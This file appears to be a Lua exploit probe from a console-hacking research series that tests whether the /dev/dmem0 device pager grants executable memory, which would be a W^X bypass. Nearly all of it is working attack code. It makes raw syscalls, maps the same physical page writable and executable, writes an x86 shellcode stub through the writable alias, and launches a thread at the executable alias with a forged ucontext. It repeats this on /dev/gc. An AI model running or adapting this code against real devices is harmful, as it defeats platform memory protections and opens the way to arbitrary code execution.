-- CRASH_CLASS: HIGH -- asks the device pager for executable pages and then executes one.
-- PROBE 1475a: does the /dev/dmem0 pager install an executable PTE the anonymous path refuses?
--
-- Context:
--   Every W^X measurement in this tree used a mapping the VM layer created for a game process:
--   424a-424c (mprotect value ladder, prot 5 maps but cannot be written, prot 7 stores then
--   faults), 54d/124a (sys 588 "page attribute modify", inert), and 1468a (one shm object mapped
--   twice, prot 3 and prot 5, fetch on the prot-5 alias refused with #PF err 0x15 = present,
--   I/D=1).  In all of those the PTE is built by the generic path and the hypervisor refuses
--   execute on any physical page that is also writable.
--
--   The /dev/dmem0 pager is a different path: 1396b/1397b measured that mmap on that node returns
--   real pages with prot 1 and prot 3, that stores into the prot-3 mapping land and are visible
--   through a second descriptor, and that the pages contain a kernel-built table at offset 0 and a
--   populated "OrbisMemory ONION" block from 0xF000.  Nobody has ever asked that pager for
--   PROT_EXEC or PROT_READ|PROT_WRITE|PROT_EXEC, and nobody has executed a page it produced.
--
--   Two outcomes matter:
--     (a) the pager refuses prot 5/7 with EACCES/EINVAL where anonymous mmap accepts prot 5 --
--         that would be a real difference worth knowing, and it closes the device pager;
--     (b) the pager accepts and a child fetched from the page reaches our stub, which would be
--         the first executable page a game process has ever held, i.e. a W^X bypass.
--
--   [A] is the protection ladder.  prot 0 and prot 5 are NOT read (an execute-only page kills
--   past pcall, CLAUDE.md rule 5); only the mmap return value and errno are printed for them.
--   [B] is the dual mapping: one page of the device mapped prot 3 and prot 5 at two addresses, the
--   stub written through the writable alias, a thr_create child sent to the executable alias.
--   Offset 0x2000 is used because 1397f measured that page as all-zero, so the write cannot damage
--   the ONION structures at 0xF000-0x16FFF.
--   [C] repeats [B] on /dev/gc, whose page reads all 0xFF, as the control that fails if the node
--   rather than the mechanism is what matters.
--
-- -- prior art:
--   results/phase36_realargs/1396b_dev_map_writable_20261109_142603.txt (prot 3 maps, stores land)
--   results/phase35_dead_end_reruns/1397b_dmem_offset_ladder_20261109_142645.txt (prot 1 and 3)
--   results/phase36_realargs/1397f_dmem_content_map_20261109_143000.txt (page 0x2000 is zero)
--   results/phase36_realargs/1468a_dual_map_wx_20261109_180339.txt (shm dual map refused, err 0x15)
--   probes/phase22_wx_bypass/424a_mprotect_all_values.lua (the anonymous prot ladder)
--   probes/phase36_realargs/1457a_kernel_readable_thrcreate.lua (ucontext gates, ctx offsets)

print("=== PROBE 1475a: DEVICE PAGER PROTECTION LADDER AND EXECUTION ===")
print("")

local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s=pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return N(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function wd(a,v) pcall(function() memory.write_dword(uint64(a),v) end) end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(uint64(a)) end) if ok then return N(v) % 4294967296 end return nil end
local function hx(v) if v==nil then return "????" end return string.format("%08X", v) end

local pid0 = N(mk(20)())
print(string.format("[0] pid=%d", pid0))

-- SIG_IGN so an absent call answers -1 rather than killing the loader
local sa = memory.alloc(0x80)
for i=0,0x7C,8 do pcall(function() memory.write_qword(sa+i,uint64(0)) end) end
pcall(function() memory.write_qword(sa,uint64(1)) end)
for _,s in ipairs({5,6,7,8,12,24,25,26,30,31}) do
    pcall(function() return mk(416)(uint64(s),uint64(sa),uint64(0)) end)
end

local function str_addr(s)
    local b = memory.alloc(#s+1)
    for i=1,#s do pcall(function() memory.write_byte(b+i-1, uint64(s:byte(i))) end) end
    pcall(function() memory.write_byte(b+#s, uint64(0)) end)
    return as_addr(b)
end

local function open_node(path)
    local fd = N(mk(5)(uint64(str_addr(path)), uint64(0x4002), uint64(0), uint64(0), uint64(0), uint64(0)))
    if fd < 0 then print(string.format("   open(%s) -> %d %s", path, fd, es())) end
    return fd
end
local function mmap_dev(fd, prot, off, len)
    local ok, rv = pcall(function() return mk(477)(uint64(0), uint64(len or 0x1000), uint64(prot), uint64(1), uint64(fd), uint64(off)) end)
    if not ok then return -999 end
    return N(rv)
end

--------------------------------------------------------------------------
-- [A] the protection ladder, /dev/dmem0 offset 0x2000
--------------------------------------------------------------------------
print("[A] /dev/dmem0 offset 0x2000, every protection value")
local dfd = open_node("/dev/dmem0")
if dfd > 0 then
    print(string.format("   fd=%d", dfd))
    for _, prot in ipairs({0, 1, 2, 3, 4, 5, 6, 7}) do
        print(string.format("   prot=%d", prot))
        local va = mmap_dev(dfd, prot, 0x2000)
        if va < 0x10000 or va > 0x8000000000 then
            print(string.format("     mmap -> %d %s", va, es()))
        else
            print(string.format("     mmap -> va=0x%X", va))
            if prot == 1 or prot == 2 or prot == 3 then
                print(string.format("     first dword=%s", hx(rd(va))))
            else
                print("     (not read: execute-only or no access)")
            end
            pcall(function() mk(73)(uint64(va), uint64(0x1000), uint64(0), uint64(0), uint64(0), uint64(0)) end)
        end
    end
else
    print("   dmem0 did not open")
end
print("")

--------------------------------------------------------------------------
-- [B] dual map one dmem page, write a stub through RW, execute the X alias
--------------------------------------------------------------------------
print("[B] dual mapping of /dev/dmem0 offset 0x2000")
local rw = -1
local xa = -1
if dfd > 0 then
    rw = mmap_dev(dfd, 3, 0x2000)
    if rw < 0x10000 or rw > 0x8000000000 then print(string.format("   RW mmap -> %d %s", rw, es())) rw = -1 end
    xa = mmap_dev(dfd, 5, 0x2000)
    if xa < 0x10000 or xa > 0x8000000000 then print(string.format("   X  mmap -> %d %s", xa, es())) xa = -1 end
end
print(string.format("   RW va=%s  X va=%s", rw > 0 and string.format("0x%X", rw) or "-", xa > 0 and string.format("0x%X", xa) or "-"))

local MARK_BLK = memory.alloc(0x20)
local MARK = as_addr(MARK_BLK)
local SENT = 0xCAFEBABE
wq(MARK, uint64(SENT))

local function run_at(target, tag)
    local Ctx = {MAGIC=0x108, TYPE=0x110, RDI=0x048, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100}
    local ctx = memory.alloc(0x500)
    local ctxa = as_addr(ctx)
    local tb = memory.alloc(8)
    local stack = memory.alloc(0x2000)
    local stk = as_addr(stack)
    for o=0,0x4F8,8 do wq(ctxa+o, 0) end
    wq(ctxa+Ctx.MAGIC, 0x480)
    wq(ctxa+Ctx.TYPE, 0x10000)
    wq(ctxa+Ctx.RDI, MARK)
    wq(ctxa+Ctx.CS, 0x43)
    wq(ctxa+Ctx.SS, 0x3B)
    wq(ctxa+Ctx.RIP, target)
    wq(ctxa+Ctx.RSP, stk + 0x1F00)
    wq(as_addr(tb), 0)
    print(string.format("   %s: spawning child RIP=0x%X", tag, target))
    local ok, rv = pcall(function() return mk(430)(uint64(ctxa), uint64(as_addr(tb)), uint64(0)) end)
    local tid = ok and N(rv) or -999
    print(string.format("   %s: thr_create -> %d", tag, tid))
    local ts = memory.alloc(16)
    wq(as_addr(ts), 0); wq(as_addr(ts)+8, 300000000)
    pcall(function() mk(240)(uint64(as_addr(ts)), uint64(0)) end)
    print(string.format("   %s: marker=%s (sentinel %s)", tag, hx(rd(MARK)), hx(SENT)))
end

if rw > 0 and xa > 0 then
    -- mov eax,0x41424344 ; mov [rdi],eax ; jmp $
    local stub = {0xB8,0x44,0x43,0x42,0x41, 0x89,0x07, 0xEB,0xFE}
    for i,v in ipairs(stub) do pcall(function() memory.write_byte(uint64(rw+i-1), uint64(v)) end) end
    print(string.format("   stub through RW alias reads back %s %s (expect 44434241, then 074189? )", hx(rd(rw)), hx(rd(rw+4))))
    run_at(xa, "dm-X")
else
    print("   no dual mapping; skipping the execution test")
end
print("")

--------------------------------------------------------------------------
-- [C] the same on /dev/gc, page reads all 0xFF
--------------------------------------------------------------------------
print("[C] /dev/gc offset 0x1000")
local gfd = open_node("/dev/gc")
if gfd > 0 then
    local grw = mmap_dev(gfd, 3, 0x1000)
    local gx  = mmap_dev(gfd, 5, 0x1000)
    print(string.format("   gc RW=%d X=%d", grw, gx))
    if grw > 0x10000 and gx > 0x10000 then
        local stub = {0xB8,0x44,0x43,0x42,0x41, 0x89,0x07, 0xEB,0xFE}
        for i,v in ipairs(stub) do pcall(function() memory.write_byte(uint64(grw+i-1), uint64(v)) end) end
        print(string.format("   gc stub reads back %s %s", hx(rd(grw)), hx(rd(grw+4))))
        run_at(gx, "gc-X")
    end
else
    print("   gc did not open")
end

print("")
print(string.format("[Z] alive pid=%d (was %d)", N(mk(20)()), pid0))
print("")
print("=== PROBE 1475a COMPLETE ===")
